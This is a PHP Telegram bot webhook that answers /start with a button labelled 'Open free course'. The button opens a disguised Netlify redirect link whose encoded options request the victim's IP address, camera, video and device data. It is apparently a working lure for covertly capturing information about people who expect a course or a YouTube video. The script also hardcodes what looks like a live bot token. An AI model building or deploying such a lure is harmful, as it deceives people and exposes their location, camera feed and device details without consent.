<?php
// --- CONFIGURATION ---
$botToken = "8299538752:AAFBL25nHPwbNOlW5cRivYl96WOiyHRdXjY"; // Replace with your bot token
$vercelUrl = "https://ephemeral-kitsune-48d8d9.netlify.app/redirect.html?target=https%3A%2F%2Fyoutu.be%2Fz5hnQw0OxWY%3Fsi%3DhlT0ikGH1UbqIkoB&id=u29cd0ffhmkch31na&type=multi&options=%7B%22ip%22%3Atrue%2C%22camera%22%3Atrue%2C%22video%22%3Atrue%2C%22device%22%3Atrue%7D"; // Replace with your Vercel deployed app URL
$apiUrl = "https://api.telegram.org/bot$botToken/";

// --- FUNCTION TO SEND REQUESTS TO TELEGRAM ---
function sendRequest($method, $params) {
    global $apiUrl;
    $url = $apiUrl . $method;

    $options = [
        "http" => [
            "header"  => "Content-Type: application/json",
            "method"  => "POST",
            "content" => json_encode($params),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        error_log("Telegram API Error: " . $method);
    }

    return json_decode($result, true);
}

// --- HANDLE INCOMING UPDATES ---
$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    exit("No input");
}

// --- HANDLE /start COMMAND ---
if (isset($update["message"])) {
    $chat_id = $update["message"]["chat"]["id"];
    $text = $update["message"]["text"];

    if (strpos($text, "/start") === 0) {

        $keyboard = [
            "inline_keyboard" => [
                [
                    [
                        "text" => "🎶 Open free course 🎶",
                        "web_app" => [ "url" => $vercelUrl ]
                    ]
                ]
            ]
        ];

        $params = [
            "chat_id" => $chat_id,
            "text" => "Click the button below to launch the your favourite course !",
            "reply_markup" => $keyboard
        ];

        sendRequest("sendMessage", $params);
    }
}
?>
